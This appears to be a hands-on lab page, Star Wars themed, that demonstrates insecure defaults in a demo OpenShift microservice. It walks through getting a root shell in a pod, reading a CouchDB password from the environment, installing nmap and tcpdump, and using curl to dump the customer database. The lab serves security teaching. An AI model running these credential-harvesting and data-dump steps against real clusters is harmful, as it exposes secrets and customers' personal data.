# How about the non-functionals?

Things look good from a functional perspective but how about the non-functionals?

Let's go!

    oc rsh $(oc get po -l deployment=customer-ms-spring --output custom-columns=:.metadata.name)

Examine who you are:

    id

Expected output:

    sh-4.2# id
    uid=0(root) gid=0(root) groups=0(root)    

Explore the env:

    env | grep PASS

Expected output:

    sh-4.2# env | grep PASS
    COUCHDB_PASSWORD=passw0rd

Install some tools:

    yum install -y tcpdump
    yum install -y nmap
    yum install epel-release
    yum install -y jq


Get the CouchDB address:

    CD_HOST=$(env | grep CUSTOMERCOUCHDB_SERVICE_HOST | cut -d"=" -f2)
    CD_USER=$(env | grep COUCHDB_USERNAME | cut -d"=" -f2)
    CD_PASSWORD=$(env | grep COUCHDB_PASSWORD | cut -d"=" -f2)

And there we go:

    curl http://${CD_USER}:${CD_PASSWORD}@${CD_HOST}:5984/_all_dbs

Expected result:

    sh-4.2# curl -s http://${CD_USER}:${CD_PASSWORD}@${CD_HOST}:5984/_all_dbs
    ["customers"]

Get the content of the database:

    curl -s http://${CD_USER}:${CD_PASSWORD}@${CD_HOST}:5984/customers/_all_docs?include_docs=true|jq

Then something happens:

![Order](../../images/potential-data-breach.png?raw=true "Title")

Let us hope for Jedi Master foo and his Friends that they do not re-use the passwords on other sites in the Galaxy. 

Also, the blue compute shop company is at risk as the safety of the shop is held by the last defenses.

If the hacker were able to perform remote code execution ..

Suddenly it feels chilly on Yavin 4 ..

Can developer Cody defend the shop? 

To exit the container type `exit` and hit enter
    
    sh-4.2# exit
    exit